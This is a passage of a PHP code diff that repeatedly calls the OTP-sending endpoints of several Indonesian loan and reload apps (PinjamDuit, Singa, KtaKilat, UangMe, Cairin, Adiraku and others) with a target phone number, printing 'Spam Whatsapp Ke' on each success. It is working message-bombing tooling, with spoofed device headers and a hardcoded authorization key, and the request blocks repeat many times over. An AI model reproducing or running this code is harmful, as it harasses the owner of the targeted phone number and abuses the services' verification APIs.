+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
+    'Device-Info:  eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " KTAKILAT ".$response."\n";
+}
+
+
+
+//UANGME
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.uangme.com/api/v2/sms_code?phone='.$nomor.'&scene_type=login&send_type=wp',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_HTTPHEADER => array(
+    'aid: gaid_15497a9b-2669-42cf-ad10-'.codex(12),
+    'android_id: b787045b140c631f',
+    'app_version: 300504',
+    'brand: samsung',
+    'carrier: 00',
+    'Content-Type: application/x-www-form-urlencoded',
+    'country: 510',
+    'dfp: 6F95F26E1EEBEC8A1FE4BE741D826AB0',
+    'fcm_reg_id: frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
+    'gaid: gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
+    'lan: in_ID',
+    'model: SM-G965N',
+    'ns: wifi',
+    'os: 1',
+    'timestamp: 1732178536',
+    'tz: Asia%2FBangkok',
+    'User-Agent: okhttp/3.12.1',
+    'v: 1',
+    'version: 28'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"code":"','","');
+if ($result == '200') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " UANGME ".$response."\n";
+}
+
+
+
+//CAIRIN
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'appVersion=3.0.4&phone='.$nomor.'&userImei='.codex(32),
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type: application/x-www-form-urlencoded'
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0"}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " CAIRIN ".$response."\n";
+}
+
+
+
+
+//ADIRAKU
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNumber":"'.$nomor.'","type":"prospect-create","channel":"whatsapp"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"message":"','","');
+if ($result == 'success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ADIRAKU ".$response."\n";
+}
+
+
+//Z4RELOAD
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.irmastore.id/apps/otp/v2/sendotpwa',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 0,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"hp":"'.$nomor.'","uuid":"MyT2H1xFo2WHoMT5gjdo3W9woys1","app_code":"z4reload"}',
+  CURLOPT_HTTPHEADER => array(
+    'content-type:  application/json',
+    'authorization:  7117c8f459a98282c2c576b519d0662f',
+  ),
+));
+
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"success":',',"');
+if ($result == 'true') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " Z4RELOAD ".$response."\n";
+}
+
+
+
+//ZONAMASTER
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://zonamaster-smart.smartserver.id/auth/verify/phone',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"phone":"62'.$nomor2.'"}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'{"','":"');
+if ($result == 'verification_id') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " ZONAMASTER ".$response."\n";
+}
+
+
+//PINJAMDUIT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code?clientType=a&appVersion=5.7.3&deviceId=3943BB257996B598232CD792EA3E5D95&hardwareid='.codex(36).'&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'phone='.$nomor.'&sms_useage=0&sms_service=2&from=0',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/x-www-form-urlencoded'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+if ($response == '{"code":"0","message":"","data":{"item":{"captchaUrl":"deprecated"}}}') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " PINJAMDUIT ".$response."\n";
+}
+
+
+
+
+//SINGA
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobile_phone":"'.$nomor.'","type":"mobile","is_switchable":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=utf-8'
+  ),
+));
+$response = curl_exec($curl);
+//echo $response;
+$result = fetch_value($response,'"msg":"','","');
+if ($result == 'Success') {
+  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
+}
+else{
+  echo " SINGA ".$response."\n";
+}
+
+
+
+//KTAKILAT
+$curl = curl_init();
+curl_setopt_array($curl, array(
+  CURLOPT_URL => 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode',
+  CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT => 10,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS =>'{"mobileNo":"'.$nomor.'","smsType":1}',
+  CURLOPT_HTTPHEADER => array(
+    'Content-Type:  application/json; charset=UTF-8',
